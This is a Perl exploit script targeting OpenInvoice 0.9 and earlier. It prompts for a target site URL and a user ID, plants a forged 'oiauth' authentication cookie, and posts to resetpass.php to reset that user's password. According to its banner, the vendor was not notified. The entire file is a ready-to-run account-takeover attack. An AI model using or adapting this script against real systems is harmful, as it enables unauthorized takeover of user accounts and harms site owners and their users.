#!/usr/bin/perl

# [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ]
# Discovered && Coded By t0pP8uZz
# Discovered On: 18 April 2008
# Vendor has not been notified!

# see exploit for more details..

# Greetz: milw0rm.com, h4ck-y0u.org, CipherCrew!

use strict;
use LWP::UserAgent;
use HTTP::Cookies;

print "-+- [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ] -+-\n";
print "-+-             (Discovered && Coded By t0pP8uZz)              -+-\n";
print "-+-                                                            -+-\n";
print "-+-   Discovered On: 18 April 2008 / Discovered By: t0pP8uZz   -+-\n";
print "-+- OpenInvoice 0.9 beta (and prior) Suffers from Insecure ... -+-\n";
print "-+- ...cookies and admin panel validating, combining the two.. -+-\n";
print "-+- .we can change any users password except for the 1st admin -+-\n";
print "-+-                                                            -+-\n";
print "-+- [ OpenInvoice 0.9 Arbitrary Change User Password Exploit ] -+-\n";

print "\nEnter URL (the vuln site): ";
	chomp(my $url=<STDIN>);
	
print "\nEnter UID (the user id to change pass for): ";
	chomp(my $uid=<STDIN>);
	
my $domain = $url;
my $count = ($domain =~ tr"/"");

if($count == 1) {
	$domain =~ s/\\//;
} elsif($count >= 3) {
	$domain =~ s/http:\/\///;
}

my $cjar = HTTP::Cookies->new( file => "cookies.txt", autosave => 1 );
$cjar->set_cookie(1, "oiauth", "1", "/", "6oogle.pl");
$cjar->save("cookies.txt");

my $ua     = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1 )', cookie_jar => $cjar );
my $result = $ua->post($url."/resetpass.php", { 'uid' => $uid, 'changepass' => 'Change Password' } );

if($result->is_success() && $result->content !~ /unable to change password/i && $uid != 1) {
	print "Password successfuly changed for userid: ".$uid."\n";
	exit;
}
print "Exploit Failed! check domain is running OpenInvoice <= 0.9, Check UID isnt 1\n";
exit;
